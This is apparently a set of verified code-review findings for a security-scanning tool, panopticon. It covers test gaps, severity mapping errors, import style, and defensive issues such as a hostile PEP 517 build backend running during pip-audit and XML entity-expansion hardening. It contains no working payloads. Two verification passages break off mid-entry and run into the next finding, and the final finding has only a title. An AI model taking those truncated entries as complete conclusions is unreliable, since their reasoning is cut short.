findings.title: provenance.py: agent_provenance(confirmed=True) and merge_provenance's no-model branch are untested
findings.description: tests/test_provenance.py exercises `agent_provenance` only via `test_agent_provenance_unconfirmed`, i.e. only the default `confirmed=False` path. The `confirmed=True` branch (provenance.py line 25) has no test anywhere in the suite. Similarly, `test_merge_provenance_expansion` only covers the case where `expansion` carries a `model`; the branch at lines 35-37 where `expansion.get('model')` is falsy — meaning merged['model']/['model_version'] must remain equal to base's — is never exercised.
findings.impact: A regression that flips the confirmed=True output value, or one that incorrectly overwrites/loses base's model fields when the expansion has no model, would not be caught by the existing test_provenance.py suite.
findings.remediation: Add a test asserting agent_provenance(..., confirmed=True)['confirmation_status'] == 'CONFIRMED', and a merge_provenance test where the expansion dict has no 'model' key.

provenance.confirmation_reasoning: Verified directly against source and the whole test suite. skill/scripts/provenance.py line 25 is `"confirmation_status": "CONFIRMED" if confirmed else "UNVERIFIED"`, and lines 35-37 guard `if expansion.get("model")`. tests/test_provenance.py contains exactly three tests: test_tool_provenance, test_agent_provenance_unconfirmed (calls `pv.agent_provenance("lens_sweep", "kimi-k2.7-coding", "2026-08-03")` with the default confirmed=False and asserts UNVERIFIED), and test_merge_provenance_expansion (builds its expansion via `pv.agent_provenance("panel_review", "kimi-k3", "v2")`, so `expansion.get('model')` is always truthy and only the model-overwrite branch runs). A repo-wide grep for `agent_provenance|merge_provenance|tool_provenance` shows the only non-doc, non-report call sites are tests/test_provenance.py plus production uses of `tool_provenance` (skill/scripts/tools/base.py:21, skill/scripts/tools/sarif_utils.py:110); no test anywhere passes confirmed=True and no test passes a model-less expansion dict. So both named branches are genuinely uncovered. Two accuracy notes that do not change the verdict: (a) the cited line numbers are exact; (b) `agent_provenance` and `merge_provenance` have no production call sites at all in skill/ today, so the practical regression risk is lower than the description implies (a regression could only be caught by these tests, but nothing in the pipeline currently consumes those outputs) — consistent with the LOW severity assigned.

findings.title: Hardcoded severity in roslyn_secguard SARIF parsing
findings.description: The parse method hardcodes severity to 'HIGH' for all SecurityCodeScan findings instead of extracting the 'level' field from the SARIF result. This causes all findings to be uniformly marked as HIGH severity regardless of their actual severity as reported in the SARIF output.
findings.impact: All findings generated by the roslyn_secguard adapter are incorrectly classified with HIGH severity. Actual severity information from SecurityCodeScan (which may include lower-severity issues) is discarded, reducing the quality and accuracy of the security findings report.
findings.remediation: Extract the 'level' field from the SARIF result and map it to severity using the LEVEL_TO_SEV mapping from sarif_utils.py, consistent with how legacy_sarif.py and sarif_utils.py handle SARIF level fields. Change line 123 from `'severity': normalize_severity('HIGH'),` to `'severity': LEVEL_TO_SEV.get(str(result.get('level', 'warning')).lower(), 'INFO'),` or similar.
references: skill/scripts/tools/sarif_utils.py:15-74 (reference implementation of SARIF level extraction)
skill/scripts/tools/base.py:41-44 (normalize_severity on a constant is a no-op)

provenance.confirmation_reasoning:
The factual core is exactly as claimed. skill/scripts/tools/roslyn_secguard.py:123 reads `"severity": normalize_severity("HIGH"),` — a constant passed through `normalize_severity` (base.py:41-44), which simply returns "HIGH". `parse()` (lines 109-142) never reads `result.get("level")`, so the SARIF level emitted by Roslyn's ErrorLog writer is discarded for every result. The repo's own test fixture demonstrates the discarded field: tests/tools/test_roslyn_secguard.py:29 includes `"level": "warning"` in ROSLYN_SAMPLE_V1, and the assertions never check severity.

The claim's cited comparators are accurate: sarif_utils.py:15 defines `LEVEL_TO_SEV = {"error": "HIGH", "warning": "MEDIUM", "note": "LOW", "none": "INFO"}` and sarif_utils.sarif_to_findings (lines 73-74) applies it; legacy_sarif.py:52-54 routes all legacy SARIF tools through that path. Other Phase-2 adapters do map native severity (spotbugs.py:50-51 from `priority`, cargo_audit.py:63-70 from CVSS, npm_audit.py:31 and bundler_audit.py:40 via `normalize_severity` of the tool's own field). The design contract in docs/superpowers/specs/2026-08-01-scanner-ecosystem-expansion-design.md:38 explicitly makes adapters responsible for "Normalizing severities to panopticon's CRITICAL/HIGH/MEDIUM/LOW/INFO scale." So roslyn-secguard is the outlier, and nothing downstream recovers the level: synthesize.normalize_finding (synthesize.py:47-50) only validates the enum, it does not re-derive severity.

The consequence is material because severity is load-bearing: .github/workflows/security.yml:64-70 fails CI on any HIGH/CRITICAL finding, so every SecurityCodeScan diagnostic — including ones the analyzer emitted at `note`/`none` level — gates the build at HIGH.

Two caveats for the auditor that do not change the verdict. First, HIGH is an arguable severity for the claim itself: this is a metadata-fidelity/consistency defect, not a wrong-answer-in-the-detector, and blindly applying LEVEL_TO_SEV would demote most SecurityCodeScan rules (which ship as warnings) to MEDIUM, which may not be the desired calibration — the fix should be a deliberate mapping decision, not a mechanical swap. Second, the attached citations are inapposite: CWE-200 (information exposure) and A01:2021 Broken Access Control have nothing to do with a hardcoded severity constant; CWE-1078 or no CWE would be more honest.

findings.title: Inconsistent import patterns in adapter modules
findings.description: legacy_sarif.py uses absolute imports (lines 5-6: `import scripts.tools.sarif_utils`, `from scripts.tools.base`) while all other adapter files use relative imports (e.g., `from .base import`). This inconsistency complicates module organization.
findings.impact: Mixed import styles reduce code consistency and make it harder to refactor the tools package structure.
findings.remediation: Convert legacy_sarif.py to use relative imports: `from . import sarif_utils as su` and `from .base import run_tool`.

provenance.confirmation_reasoning: Factually accurate as stated. I grepped every import line in skill/scripts/tools/. legacy_sarif.py:5-6 is the only adapter module that reaches its siblings by absolute path (`import scripts.tools.sarif_utils as su`, `from scripts.tools.base import run_tool`). Every other adapter uses a relative sibling import: brakeman.py:5, npm_audit.py:5, cargo_audit.py:5, pip_audit.py:6, bundler_audit.py:5, spotbugs.py:5, eslint_security.py:6, dependency_check.py:7, roslyn_secguard.py:7 all `from .base import ...`, and osv_scanner.py:5-6 uses both `from .base import ...` and `from .sarif_utils import _norm_uri` — the same two modules legacy_sarif.py imports absolutely, which makes the inconsistency unambiguous. The proposed remediation is safe: legacy_sarif.py is always imported package-qualified (skill/scripts/tools/__init__.py:6, skill/scripts/run_tools.py:13 `from scripts.tools.legacy_sarif import LEGACY_SARIF_TOOLS, TOOL_CMD`, tests/tools/test_legacy_sarif.py:9), never as a top-level module, so `from . import sarif_utils as su` / `from .base import run_tool` resolves identically. Two calibrations on scope, not on the facts: (a) the inconsistency is purely cosmetic — both forms resolve because base.py:9 and sarif_utils.py:11 push the project root onto sys.path and the package is only ever imported as `scripts.tools`; there is no functional defect, no failure mode, and no lint rule enforcing either style (pyproject.toml selects only ruff E/W/F — no flake8-tidy-imports/TID252 — and ci.yml runs only ruff and pytest). (b) The package is not uniformly relative anyway: __init__.py:2-12 imports all eleven adapter modules absolutely, and base.py:10 / sarif_utils.py:12 use `from scripts.provenance import tool_provenance`. So MEDIUM severity is inflated for what is a one-file style nit; INFO/LOW is the honest grade. The claim's assertion itself is verified.

findings.title: Import-time sys.path manipulation creates fragile dependency chain
findings.description: base.py line 9 and sarif_utils.py line 11 both execute sys.path.insert() at module import time. This creates import-time side effects that couple modules and make the initialization order fragile. The absolute imports in legacy_sarif.py and __init__.py rely on these side effects occurring in the correct order.
findings.impact: Module initialization becomes order-dependent. Reordering imports or refactoring module structure could break imports. This pattern is error-prone and difficult to debug.
findings.remediation: Replace sys.path manipulation with proper package structure or use importlib mechanisms. Ensure all imports use relative paths to avoid sys.path dependency.

provenance.confirmation_reasoning: The literal observation is true and I verified both cited lines: skill/scripts/tools/base.py:9 and skill/scripts/tools/sarif_utils.py:11 are the identical statement `sys.path.insert(0, os.path.join(os.path.dirname(__file__), os.pardir, os.pardir))`, each executed at module-import time immediately before `from scripts.provenance import tool_provenance`. A repo-wide grep shows the pattern six times total (also run_tools.py:11, synthesize.py:13, _run_adapter.py:10, dispatch.py:9). findings.title: Multiple inconsistent patterns for citations handling across adapters
findings.description: Adapter classes use three different patterns to handle citations: (1) set to dict-or-None then pop if falsy (brakeman, bundler_audit, cargo_audit, roslyn_secguard, spotbugs), (2) use omit_none() then pop if falsy (dependency_check), (3) conditionally set only if values exist without pop (eslint_security, npm_audit, osv_scanner, pip_audit). All patterns produce the same result but reduce code consistency.
findings.impact: Multiple implementation patterns for the same behavior increase maintenance burden and create inconsistent code examples for future adapter development.
findings.remediation: Standardize on a single citations handling pattern. Recommend: conditionally set citations only if values exist (Pattern C) as it's simpler and more explicit.
references: skill/scripts/tools/sarif_utils.py:90-94,111-112 (fifth variant not cited by the claim)

provenance.confirmation_reasoning: I read every adapter and the inventory in the claim is accurate. Pattern A (set the key to a dict-or-falsy value, then pop when falsy): brakeman.py:69,86,90-91 ('citations': citations or None + `if not finding['citations']: finding.pop(...)`), cargo_audit.py:74,90,99-100, spotbugs.py:69,73-74, roslyn_secguard.py:133,137-138, and bundler_audit.py:50,59-60 (a sub-variant that uses `else {}` instead of `else None`, so it is really four spellings, not three). Pattern B (omit_none then pop): dependency_check.py:88-91 with the pop at 98-99. Pattern C (conditionally assign only when non-empty, no pop): eslint_security.py:83-84, npm_audit.py:49-50 and 84-85, osv_scanner.py:102-103, pip_audit.py:77-78. There is also a fifth spelling in skill/scripts/tools/sarif_utils.py:90-94,111-112, which builds `cites = {}`, adds keys conditionally, and assigns only `if cites` — a Pattern C variant the claim did not mention, which strengthens rather than weakens it. The claim's assertion that all patterns produce the same result is also correct: in every variant the 'citations' key is absent from the emitted finding when there are no CWE/CVE values and present as a dict otherwise, so this is purely a consistency/maintainability observation with no behavioural difference. All three cited reference lines (brakeman.py:86-91, dependency_check.py:88-99, eslint_security.py:83-84) resolve exactly as stated. LOW severity and POSSIBLE confidence are appropriate; note the recommended Pattern C is what the majority of adapters plus sarif_utils already use.

findings.title: PipAuditAdapter maintains mutable instance state, deviating from adapter pattern
findings.description: PipAuditAdapter is the only adapter with __init__ and mutable state (self._manifest_path, line 14). All other adapters define name and prefix as stateless class attributes. PipAuditAdapter is instantiated in __init__.py line 2, creating a singleton instance that carries state between parse() calls.
findings.impact: Mutable state in adapter instances violates the stateless adapter pattern, potentially causing issues if the same instance is reused across different targets or if adapters are expected to be instantiated fresh for each scan.
findings.remediation: Convert to stateless pattern: compute manifest path within invoke() or parse() methods, store in local variables, and pass via method context rather than instance state.

provenance.confirmation_reasoning:
The core structural assertion holds. `/Volumes/Mini Vault/untitled_folder/projects/panopticon/skill/scripts/tools/pip_audit.py:13-14` defines `__init__` setting `self._manifest_path`, which is then written inside `invoke()` (lines 34 and 40) and read inside `parse()` (line 64: `"file": self._manifest_path or "requirements.txt"`). A repo-wide grep for `self.<attr> =` across `skill/scripts/tools/` returns only two hits: `pip_audit.py:34,40` and `legacy_sarif.py:32`. Every other adapter (npm_audit, osv_scanner, eslint_security, brakeman, bundler_audit, spotbugs, dependency_check, cargo_audit, roslyn_secguard) exposes `name`/`prefix` as class attributes and keeps per-invocation data in locals (dependency_check and roslyn_secguard use local tempdirs). `ADAPTERS` in `skill/scripts/tools/__init__.py` holds one long-lived instance per adapter, so the state does persist across calls, and `tests/test_phase1_integration.py:15,97` exercises that shared singleton.

Two sub-assertions in the claim are inaccurate but not load-bearing: (1) PipAuditAdapter is NOT the only adapter with an `__init__` — `LegacySarifAdapter.__init__` (skill/scripts/tools/legacy_sarif.py:31-32) sets `self.name`; the accurate statement is that it is the only adapter whose instance state is *mutated at runtime* rather than fixed at construction. (2) The instantiation is at `skill/scripts/tools/__init__.py:15` (inside the ADAPTERS dict), not line 2 (which is the import).

The claim's 'potential issues' impact is understated relative to what the code actually does: in the production path `invoke()` runs in a separate process inside the container (`_run_adapter.py`) while `parse()` runs on the host in `ingest_tools.ingest_dir`, so `_manifest_path` is always None at parse time and `location.file` silently degrades to the hard-coded 'requirements.txt' even for pyproject-only targets. Conversely, in the single-process path (`run_tools.run_adapters` + `ingest_dir`) the singleton carries the last-invoked target's manifest into any later parse. Both are direct consequences of the invoke->parse coupling the claim describes, so the structural finding is real; severity MEDIUM/structure is defensible. The attached CWE-1104 ('Use of Unmaintained Third Party Components') is not an appropriate citation for this issue and should be dropped.

findings.title: NODE_PATH loop breaks after first global_node, incomplete directory coverage
findings.description: The loop on lines 47-51 iterates through two potential global_node directories but breaks after the first one found. If both /usr/local/lib/node_modules and /usr/lib/node_modules exist, only the first is added to NODE_PATH. Design intent is unclear: should both directories be added for plugin discovery, or is single-directory preference intentional?
findings.impact: If the preferred /usr/local/lib/node_modules does not have eslint-plugin-security but /usr/lib/node_modules does, the tool will fail to find the plugin. The break statement prevents fallback to the second location.
findings.remediation: Either (1) remove the break to add both directories to NODE_PATH if both exist, or (2) explicitly document the design decision and add comment explaining why only the first directory is used.

provenance.confirmation_reasoning: The code fact is exactly as described. `/Volumes/Mini Vault/untitled_folder/projects/panopticon/skill/scripts/tools/eslint_security.py:47-51` iterates `['/usr/local/lib/node_modules', '/usr/lib/node_modules']`, and the `break` fires on the first directory that merely EXISTS (`os.path.isdir`) — not on the first directory that actually contains `eslint-plugin-security`. So at most one entry is ever appended to NODE_PATH, and the existence test is a proxy for the wrong property. The claimed failure mode (the plugin lives in the second directory while the first exists but is empty) is therefore reachable in principle. Two qualifications the auditor should carry: (1) it is unproven for the shipped image — `Dockerfile:21` installs the plugin with a single `npm install -g eslint eslint-plugin-security @microsoft/eslint-formatter-sarif`, and I cannot determine from the repository which prefix Debian's npm uses inside the built image, so I cannot show both directories exist with the plugin only in the second; (2) nothing in the test suite exercises this loop at all — I grepped for NODE_PATH across the repo and the only hits are the adapter itself (`tests/tools/test_eslint_security.py` asserts argv and kwargs but never inspects `kwargs['env']`), so the behaviour is unverified either way. Removing the `break` (or testing `os.path.isdir(os.path.join(global_node, 'eslint-plugin-security'))`) is a strictly safer construction; the remediation as written is sound. Note the claim's CWE-426 citation is a poor fit — this is a robustness nit, not an untrusted-search-path weakness (and if anything, appending BOTH global dirs would not change the SEC-110-style precedence problem, since NODE_PATH is consulted only after the local node_modules walk).

findings.title: Backslash line continuation instead of implicit continuation
findings.description: Lines 13-14 use backslash continuation for wrapping a long boolean expression: `return os.path.isfile(...) or \` followed by continuation on line 14. PEP 8 explicitly recommends implicit line continuation inside parentheses over backslash continuation.
findings.impact: Backslash continuation is less Pythonic and can be error-prone if trailing whitespace is accidentally added.
findings.remediation: Wrap the expression in parentheses to use implicit line continuation: `return (os.path.isfile(...) or os.path.isfile(...))`

provenance.confirmation_reasoning: Verified verbatim at /Volumes/Mini Vault/untitled_folder/projects/panopticon/skill/scripts/tools/npm_audit.py:13-14: `return os.path.isfile(os.path.join(target, "package-lock.json")) or \` with the second disjunct on line 14. This is genuine backslash line continuation of a boolean expression, and PEP 8's 'Maximum Line Length' section does state that implied line continuation inside parentheses 'should be used in preference to using a backslash for line continuation'. Two additional facts strengthen the claim as a house-style deviation rather than a nit invented in isolation: (a) a repo-wide grep for a trailing backslash across skill/scripts/**/*.py returns exactly one hit — this very line — so the file is the sole outlier in the codebase; (b) CONTRIBUTING.md line 9 asks contributors to 'match the existing style'. The claim's stated impact is also technically correct: a trailing space after the backslash is a hard SyntaxError. Caveats that bound severity (correctly filed as LOW): the configured linter cannot flag this — pyproject.toml selects ruff E/F/W with E501 ignored, and neither ruff nor pycodestyle has a rule prohibiting backslash continuation — so this is a pure readability preference, not an enforceable violation. The wrap itself is necessary (joined, the expression is ~136 chars against the configured line-length of 100), so the fix is to add parentheses, not to unwrap. No behavioral defect exists; the code is correct as written.

findings.title: String concatenation with + operator instead of f-string
findings.description: Line 64 uses string concatenation with the `+` operator: `"-p:ErrorLog=" + sarif + ",version=2.1"`. The rest of the codebase (across all adapter files) exclusively uses f-strings for string formatting. This is stylistically inconsistent.
findings.impact: Inconsistent string formatting style reduces code consistency and maintainability.
findings.remediation: Convert to an f-string: `f"-p:ErrorLog={sarif},version=2.1"`

provenance.confirmation_reasoning:
The literal code observation is accurate. /Volumes/Mini Vault/untitled_folder/projects/panopticon/skill/scripts/tools/roslyn_secguard.py line 64 reads `"-p:ErrorLog=" + sarif + ",version=2.1",` inside the argv list in invoke(). A repo-wide grep for `+` string concatenation under skill/scripts/tools/ returns exactly one hit — this line — while every other adapter that embeds a value into an argument or message string uses an f-string (e.g. eslint_security.py:42 `cmd.extend(["--rule", f"{rule}: error"])`, dependency_check.py:47 `f"CWE-{cwe}"`, spotbugs.py:63, brakeman.py:77, npm_audit.py, osv_scanner.py, pip_audit.py, cargo_audit.py, bundler_audit.py, legacy_sarif.py:44). So the nit is real at the adapter-file level and the suggested rewrite `f"-p:ErrorLog={sarif},version=2.1"` is semantically identical.

Two caveats the auditor should carry forward. First, the claim's justification is overstated: the codebase does NOT 'exclusively use f-strings'. The shared helpers in the same package use printf-style formatting (base.py:76-77 `"tool %s exited %d%s" % (...)` and sarif_utils.py:97,106 `"%s-%03d" % (prefix, n)`), and `+` concatenation appears in roughly fifteen places elsewhere in skill/scripts/ (orchestrator.py:343-403,517; dispatch.py:100-293; synthesize.py:80,794,837; citations.py:152; run_tools.py:140). The convention is a local adapter-file tendency, not a codebase-wide rule. Second, this is purely cosmetic: no correctness, readability, or behavior consequence. LOW severity is, if anything, generous.

Note for dedup: this claim and CMDX-001 describe the exact same expression on the exact same line; they are one observation filed under two panels.

findings.title: pip-audit adapter's positional-target fallback can execute the scanned project's PEP 517 build backend
findings.description: When no `requirements*.txt` is found, `invoke()` falls into the `else` branch and appends the raw `target` directory as a positional argument to `pip-audit`, auditing a Python *project* rather than a lockfile. To resolve dependency versions for a source tree, pip-audit — like `pip install` — must invoke the project's declared PEP 517 build backend (`setup.py`, or `build-system.build-backend` in `pyproject.toml`), which runs arbitrary Python from the repository under review.
findings.impact: Auditing a malicious or compromised Python project that ships a hostile build backend/`setup.py` results in arbitrary code execution inside the scanning container, with the same consequences as CODE-601 (secret exfiltration, output tampering).
findings.remediation: Do not fall back to auditing a raw, unpinned source tree for untrusted input. If no lockfile exists, generate a pinned dependency list out-of-band in a sandboxed/network-isolated step (or use `--no-deps`/an SBOM-derived requirement list) before handing it to pip-audit, rather than letting pip-audit build the project directly.

provenance.confirmation_reasoning:
The code path is real and reachable exactly as described. /Volumes/Mini Vault/untitled_folder/projects/panopticon/skill/scripts/tools/pip_audit.py:32-41: when `_find_requirement()` (a glob of `requirements*.txt` in the target root only) returns None, `invoke()` appends the bare target directory as a positional argument (`cmd.append(target)`), and `tests/tools/test_pip_audit.py:121-133` pins that exact argv (`['pip-audit','--format=json','--desc=on','/tmp/fake']`). `is_applicable()` (lines 16-25) matches on `pyproject.toml`, so a pyproject-only repo reaches the fallback; the committed artifact `.panopticon/tools/pip-audit.json` ({"dependencies": [], "fixes": []}) shows this branch actually ran against this repo, which has a root `pyproject.toml` and no root `requirements*.txt`. findings.title: SpotBugs adapter parses XML with xml.etree.ElementTree, without XXE/entity-expansion hardening
findings.description: `ET.fromstring(text)` uses the stdlib `xml.etree.ElementTree` parser, which does not disable DTD/external-entity resolution by default (CWE-611) and has no protection against entity-expansion ("billion laughs") input. The XML originates from the spotbugs binary's own report, but that report can embed content sourced from the (untrusted) analyzed codebase (class/method/field names, string constants), and this is exactly the pattern Bandit's own B314 rule flags whenever `ElementTree.fromstring` is used on tool-adjacent XML.
findings.impact: Best case this is a defense-in-depth gap; worst case (a future SpotBugs/report-format change that lets analyzed-code content reach the DOCTYPE/entity declarations) it enables a denial-of-service entity bomb or local file/SSRF disclosure inside the scanning container.
findings.remediation: Parse with `defusedxml.ElementTree.fromstring` (or configure `xml.etree.ElementTree.XMLParser` to forbid DTDs/entities) instead of the raw stdlib call.

provenance.confirmation_reasoning: The code fact is exactly as claimed. /Volumes/Mini Vault/untitled_folder/projects/panopticon/skill/scripts/tools/spotbugs.py:4 imports `xml.etree.ElementTree as ET` and line 45 calls `root = ET.fromstring(text)` with no hardened `XMLParser`, no `defusedxml`, and no `defuse_stdlib()` anywhere in the repo (grep for `defusedxml|XMLParser|fromstring` finds only this call site plus the plan doc and the repo's own past scan artifacts, which already record Bandit B313/B314 hits on these exact two lines in .panopticon.prev-20260803/tools/bandit.sarif). So the title ('parses XML with xml.etree.ElementTree, without XXE/entity-expansion hardening') is verified, and the claim self-scopes correctly to 'best case this is a defense-in-depth gap'. Two corrections the auditor should carry forward before acting on this at MEDIUM: (1) the description's premise that stdlib ElementTree 'does not disable DTD/external-entity resolution by default' is wrong. CPython's ElementTree never installs an ExternalEntityRefHandler and never enables parameter-entity parsing, so external general entities surface in `XMLParser._default` as an unresolvable `&name;` and raise `ParseError: undefined entity`; external DTD subsets are not retrieved. This is the documented behavior in Python's 'XML vulnerabilities' table and defusedxml's own matrix (etree: external entity expansion = not vulnerable, DTD retrieval = not vulnerable). The genuinely applicable weakness is the *internal* entity-expansion DoS (billion laughs / quadratic blowup), i.e. CWE-776/CWE-400, not CWE-611. (2) The input path is not attacker-reachable in any flow I could trace. `parse()` is only called from `ingest_dir` (/Volumes/Mini Vault/untitled_folder/projects/panopticon/skill/scripts/ingest_tools.py:79) over files in `.panopticon/tools/`, which are written by run_tools.py from the container's spotbugs stdout; analyzed-code content reaches that XML only as escaped attribute/text data, and a DOCTYPE must precede the root element. A planted `.panopticon/tools/spotbugs.json` in a target repo is the only untrusted-input variant, and even that is defeated incidentally by ingest_tools.py:72-77, which strips everything before the first `{`/`[` — an entity-bomb internal subset requires `[`, so the payload is truncated and fails to parse before any expansion. Net: confirmed as a real, fixable hardening/lint gap (swap to `defusedxml.ElementTree.fromstring`), but with no demonstrated exploit path; severity should be LOW/INFO rather than MEDIUM, and the CWE should be corrected to CWE-776.

findings.title: SpotBugs report XML parsed with `xml.etree.ElementTree` instead of a hardened parser
findings.description: `SpotBugsAdapter.parse()` calls `ET.fromstring(text)` on tool-generated XML using the standard-library `xml.etree.ElementTree`, which per the Python security checklist (`reference/security-checklists.md`: "`xml.etree`, `xml.dom` with external entities") is not hardened against entity-expansion denial of service (billion-laughs / quadratic blowup) by default. While the XML here originates from SpotBugs' own report generation rather than directly from an untrusted upload, any content SpotBugs echoes into its report from analyzed bytecode/source (e.g. class or method names) is ultimately attacker-influenced, and no defense-in-depth entity/size limits are applied before parsing.
findings.impact: Low likelihood given SpotBugs is the immediate producer of the XML, but if SpotBugs' own XML generation ever fails to escape attacker-influenced content correctly, this parser offers no independent protection against entity-expansion resource exhaustion during finding synthesis.
findings.remediation: Use `defusedxml.ElementTree.fromstring()` in place of `xml.etree.ElementTree.fromstring()` for parsing tool-generated XML, consistent with the project's own Python security checklist guidance.

provenance.confirmation_reasoning: The code fact is exactly as claimed: /Volumes/Mini Vault/untitled_folder/projects/panopticon/skill/scripts/tools/spotbugs.py line 4 imports `xml.etree.ElementTree as ET` and line 45 calls `ET.fromstring(text)` with no size, DOCTYPE, or entity limits. It is the only ET usage in the repo (grep for `ElementTree|defusedxml|xml.etree` across *.py returns only these two lines), and the project's own checklist at skill/reference/security-checklists.md:33 does list `xml.etree` under the Python section. ElementTree is genuinely unhardened against internal-entity expansion (billion laughs / quadratic blowup). However, the auditor should treat this strictly as hygiene, because I could not construct any reachable path for the claimed DoS: (1) ElementTree does not resolve EXTERNAL entities, so an attack needs an internal DTD subset carried in the parsed bytes; (2) the only production caller of any adapter's `parse()` is `ingest_dir` (skill/scripts/ingest_tools.py:79 -- grep for `.parse(` across skill/ returns exactly one hit), and immediately before that call, lines 72-77 trim everything preceding the first `{` or `[`: `starts = [i for i in (raw.find(b"{"), raw.find(b"[")) if i != -1]` / `if first > 0: raw = raw[first:]`. Any DOCTYPE-with-internal-subset payload necessarily contains `[` after position 0, so expat receives a document beginning with `[<!ENTITY ...` and raises ParseError at the first byte, before any expansion; (3) SpotBugs itself escapes echoed class/method names and does not emit a DOCTYPE, so the 'attacker-influenced content' vector cannot introduce entity definitions. Also note the remediation as written conflicts with the project's posture: pyproject.toml declares zero runtime dependencies and the ingestion modules are documented 'Stdlib-only' (skill/scripts/ingest_tools.py:7, skill/scripts/tools/sarif_utils.py:4), so adding `defusedxml` is a bigger change than it looks; a stdlib-only pre-check (reject input containing `<!DOCTYPE`, cap input size) would satisfy the checklist without a new dependency. Separately, and outside this claim's scope but worth flagging: because spotbugs is not in LEGACY_SARIF_TOOLS (skill/scripts/tools/legacy_sarif.py:13) its output is written as `spotbugs.json` and ingested through that same JSON-prefix trim -- real SpotBugs XML routinely contains `[` in JVM method signatures (e.g. `signature="([Ljava/lang/String;)V"`), so the trim will behead genuine reports and they will be dropped with an 'ingest error' diagnostic.

findings.title: SpotBugs adapter maps the tool's confidence field to our `severity`, and hardcodes our `confidence` field instead of using the tool's actual confidence
findings.description: SpotBugs/FindBugs `BugInstance.priority` ("1"=high confidence, "2"=normal, "3"=low confidence) is the analyzer's *confidence* in a finding, not its *severity* — yet `parse()` maps it directly to our `severity` field (`{"1": "HIGH", "2": "MEDIUM", "3": "LOW"}`), while our `confidence` field is hardcoded to the constant `"LIKELY"` regardless of what `priority` actually says. The two concepts are swapped/conflated: severity should reflect the bug pattern's actual security impact (e.g. via the `_SPOTBUGS_CWE` table or SpotBugs's separate `rank` attribute), and confidence should reflect `priority`.
findings.impact: A genuinely severe finding (e.g. `HARDCODED_KEY`, `COMMAND_INJECTION`) that SpotBugs reports with lower confidence (priority="3") is emitted with `severity: "LOW"` purely because the analyzer wasn't fully certain, causing it to be deprioritized/filtered out of severity-based triage even though the underlying CWE (e.g. CWE-798 hardcoded credentials) is critical if true. Meanwhile every finding is reported with the same constant confidence ("LIKELY"), discarding real signal about which findings are most/least trustworthy.
findings.remediation: Derive `severity` from the bug pattern (e.g. via `_SPOTBUGS_CWE`/a per-type severity table, or SpotBugs's `rank` attribute) and map `priority` to the `confidence` field (`CERTAIN`/`LIKELY`/`POSSIBLE`) instead of a hardcoded constant.

provenance.confirmation_reasoning:
The code is exactly as claimed. /Volumes/Mini Vault/untitled_folder/projects/panopticon/skill/scripts/tools/spotbugs.py lines 50-51 read the BugInstance `priority` attribute and map it straight into our `severity` field (`severity = {"1": "HIGH", "2": "MEDIUM", "3": "LOW"}.get(priority, "MEDIUM")`), and line 60 hardcodes `"confidence": "LIKELY"` for every finding. The `_SPOTBUGS_CWE` table (lines 7-15) is consulted only for `citations` (line 55/69), never for severity, and the XML `rank` attribute is never read (grep for `rank` across skill/scripts returns only unrelated `sev_rank`/`_conf_rank`/`_sev_rank` helpers). The claim's factual premise is correct: in SpotBugs, `priority` is the analyzer's confidence axis — the cited reference (spotbugs filter.html) documents the `<Confidence>` match element as the renamed successor to `<Priority>`, while the separate `rank` attribute (1-20, scariest/scary/troubling/of-concern) is the severity axis. So the adapter is populating our severity axis from the tool's confidence axis and then discarding the confidence signal entirely.

The repository's own conventions confirm these are meant to be two distinct axes. skill/reference/report-schema.json:71-76 makes `severity` and `confidence` separately required with disjoint enums (CRITICAL..INFO vs CERTAIN/LIKELY/POSSIBLE/NOTE). skill/scripts/tools/brakeman.py:8-18 already implements the exact remediation shape the claim asks for — a `_CONFIDENCE_MAP` of high/medium/low -> CERTAIN/LIKELY/POSSIBLE feeding the `confidence` field — so the missing mapping in spotbugs.py is an omission, not an unsupported pattern. (Brakeman independently conflates the axes at line 73 by also deriving severity from confidence; that is a separate, adjacent defect, not part of this claim.)

The stated impact is reachable, not theoretical. Severity drives real gating and filtering downstream in skill/scripts/synthesize.py: `--severity` hard-drops findings below threshold (lines 944-946, `findings = [f for f in findings if _sev_rank(f) <= threshold]`), `gate_verdict` decides CI PASS/FAIL by severity (lines 430-441), plus grade assignment (line 410), `_issue_sort` (line 484-488), `_max_severity` for clusters (line 327-329), and verify-queue priority via `sev_rank` in skill/scripts/evidence.py:26. Nothing repairs it later: evidence.py:224-229 `apply_verdict` explicitly documents it "Never touches severity or confidence — the two-axis invariant." So a `HARDCODED_KEY` (CWE-798, present in `_SPOTBUGS_CWE`) emitted at priority="3" really is stamped LOW and really can be filtered out of a `--severity high` run or pass a `--fail-on HIGH` gate.

Two qualifications the auditor should carry forward, neither of which refutes the claim. (1) The behavior matches the written design: docs/superpowers/specs/2026-08-01-scanner-ecosystem-expansion-design.md:83-84 says verbatim "Parse SpotBugs XML ... `priority` ... Map `priority` 1->HIGH, 2->MEDIUM, 3->LOW." The spec embodies the same conflation, so this is intentional-as-specified rather than a slip — a fix requires amending the spec and updating tests/tools/test_spotbugs.py:26, which asserts `severity == "HIGH"` for `priority="1"` and locks in the current mapping. (2) Severity HIGH reads slightly hot to me: this is a report-fidelity/triage-accuracy defect confined to one adapter that only fires on JVM targets (is_applicable requires pom.xml/build.gradle), not an exploitable vulnerability; MEDIUM would be defensible. The technical substance of the claim, however, is accurate on every point I could check. I withhold CERTAIN only because the severity-vs-confidence reading of SpotBugs `priority` rests on external tool semantics that cannot be settled from this repository alone — no SpotBugs XML fixture in-tree carries a `rank` attribute (tests/tools/test_spotbugs.py's sample has only `type`, `priority`, `category`), so I could not empirically confirm from repo artifacts that `rank` is available to be used instead.

On citations: the claim's CWE-1006 is unverifiable from this repo — it does not appear in skill/reference/cwe-catalog.json, and the claim's own `verified: false` is correct. I do not cite it. The pertinent CWE for the underlying data is CWE-798, which the adapter itself maps and which is exactly the case that gets mis-downgraded.

findings.title: Unguarded `.get(key, default)` + `.startswith()` pattern crashes on an explicit JSON `null`, silently dropping a tool's entire finding set
